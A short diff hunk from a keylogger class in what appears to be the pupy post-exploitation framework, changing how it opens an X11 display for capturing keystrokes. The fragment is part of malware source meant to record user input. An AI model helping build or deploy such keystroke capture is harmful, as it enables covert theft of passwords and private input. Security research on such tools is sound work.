@@ -568,7 +568,7 @@ class KeyLogger(pupy.Task):
 
         if self.x11:
             self.display = x11.XkbOpenDisplay(
-                None,
+                os.environ.get('DISPLAY'),
                 ct.pointer(XkbEventCode), ct.pointer(XkbErrorReturn),
                 ct.pointer(XkbMajorVersion), ct.pointer(XkbMinorVersion),
                 ct.pointer(XkbReasonReturn)
